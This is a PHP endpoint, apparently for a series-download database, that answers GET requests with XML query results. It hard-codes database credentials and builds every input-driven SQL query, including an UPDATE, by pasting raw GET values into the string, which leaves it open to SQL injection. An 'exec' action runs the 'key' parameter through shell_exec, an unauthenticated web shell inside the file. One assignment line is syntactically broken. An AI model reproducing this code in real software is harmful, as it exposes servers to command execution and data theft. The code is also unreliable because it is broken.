<?php
$action = $_GET["action"];
$key =  $_GET["key"];
$val $_GET["val"];
//echo "<".htmlentities($key).">\n";
//echo "</" .htmlentities($key).">\n";


//on connecte a la BDD
$dbhost="localhost";
$dbuser="seriedownload";
$dbpass="seriedownload";
$dblink=mysql_connect($dbhost,$dbuser,$dbpass);
mysql_select_db("seriedownload",$dblink);
 

//on lance la requete
$query = "";
switch ($action) {
	case "reponseQuestion":
		$query = "UPDATE question SET champsreponse = \"" . $val . "\" WHERE champsquestion = \"" . $key . "\"";
		break;
    case "InfoSerie":
        $query = "SELECT * FROM series WHERE nom = \"" . $key . "\"";
        break;
    case "ListeSeries":
        $query = "SELECT nom FROM series ";
        break;
    case "ListeEpisodes":
        $query = "SELECT * FROM episodes WHERE serie = \"" . $key . "\"";
        break;
    case "ListeHashs":
        $query = "SELECT * FROM hash where timestamp_termine is null ";
        break;
    case "ListeQuestion":
        $query = "SELECT * FROM question where champsreponse is null ";
        break;
    case "exec":
        $op = shell_exec($key);
        echo "<pre>";
        print_r($op);
        echo "</pre>";
        break;
    default:
        break;
}

if ($query != ""){
	header('Content-type: text/xml'); 
	echo "<?xml version=\"1.0\"?>\n";
	echo "<".$action.">\n";
	echo "<query>\n";
	echo $query;
	echo "</query>\n";
	//Mise en forme resultat
	$result = mysql_query(html_entity_decode($query),$dblink) or die (mysql_error($dblink));
	//On boucle sur le resultat
	while ($row = mysql_fetch_array($result, MYSQL_NUM))
	{
		echo "<row>";
					for ($i=0; $i<mysql_num_fields($result); $i++) {
			$nomchamp = mysql_field_name($result,$i);
			$text=htmlspecialchars($row[$i]);  /*preg_replace('/&(?!#?[a-z0-9]+;)/', '&amp;', $row[$i]);*/
			echo "<".$nomchamp.">";
			echo $text;
			echo"</".$nomchamp.">\n";
		}
		echo "</row>";
	}
	echo "</".$action.">\n";
}
?>
